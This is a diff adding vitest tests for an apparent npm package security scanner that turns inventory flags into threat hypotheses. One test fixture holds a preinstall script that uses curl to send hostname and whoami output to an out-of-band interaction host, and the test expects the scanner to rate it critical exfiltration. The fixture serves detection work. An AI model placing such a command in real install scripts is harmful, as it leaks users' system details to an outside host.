@@ -1,7 +1,8 @@
 import { describe, it, expect } from "vitest";
 import { Hypothesis } from "@npmguard/shared";
-import { buildMapPrompt, draftToHypothesis, MAP_SYSTEM } from "./triage.js";
+import { buildMapPrompt, draftToHypothesis, MAP_SYSTEM, synthesizeInventoryHypotheses } from "./triage.js";
 import type { PackageIntent } from "./intent-extraction.js";
+import type { InventoryReport } from "../models.js";
 
 const intent: PackageIntent = {
   statedPurpose: "Parses CSV files into JSON.",
@@ -162,5 +163,73 @@ describe("draftToHypothesis", () => {
       now,
     });
     expect(h.claim.gating).toBeNull();
+  });
+});
+
+describe("synthesizeInventoryHypotheses", () => {
+  const baseInventory: InventoryReport = {
+    metadata: {
+      name: "fixture",
+      version: "1.0.0",
+      description: null,
+      license: null,
+      homepage: null,
+      keywords: [],
+      repository: null,
+    },
+    scripts: {},
+    entryPoints: { install: [], runtime: ["index.js"], bin: [] },
+    dependencies: { prod: {}, dev: {}, optional: {}, peer: {} },
+    files: [],
+    flags: [],
+    dealbreaker: null,
+  };
+
+  it("turns suspicious shell lifecycle network exfil into a critical hypothesis", () => {
+    const hyps = synthesizeInventoryHypotheses({
+      packagePath: "/tmp/does-not-matter",
+      now: "2026-04-24T12:00:00.000Z",
+      startCounter: 2,
+      inventory: {
+        ...baseInventory,
+        flags: [
+          {
+            severity: "warn",
+            check: "non-node-script",
+            detail:
+              "Lifecycle script 'preinstall' is not a node command: curl --data-urlencode \"info=$(hostname && whoami)\" aejxvzefqctwzcphkyqmwdl8zymn15ebx.oast.fun",
+            file: null,
+          },
+        ],
+      },
+    });
+
+    expect(hyps).toHaveLength(1);
+    expect(hyps[0]!.hypId).toBe("trg-0003");
+    expect(hyps[0]!.claim.kind).toBe("env_exfil");
+    expect(hyps[0]!.severity).toBe("critical");
+    expect(hyps[0]!.focusFiles).toEqual(["package.json"]);
+    expect(hyps[0]!.createdBy).toBe("inventory");
+  });
+
+  it("ignores benign non-node lifecycle scripts without network exfil shape", () => {
+    const hyps = synthesizeInventoryHypotheses({
+      packagePath: "/tmp/does-not-matter",
+      now: "2026-04-24T12:00:00.000Z",
+      startCounter: 0,
+      inventory: {
+        ...baseInventory,
+        flags: [
+          {
+            severity: "warn",
+            check: "non-node-script",
+            detail: "Lifecycle script 'postinstall' is not a node command: echo done",
+            file: null,
+          },
+        ],
+      },
+    });
+
+    expect(hyps).toEqual([]);
   });
 });
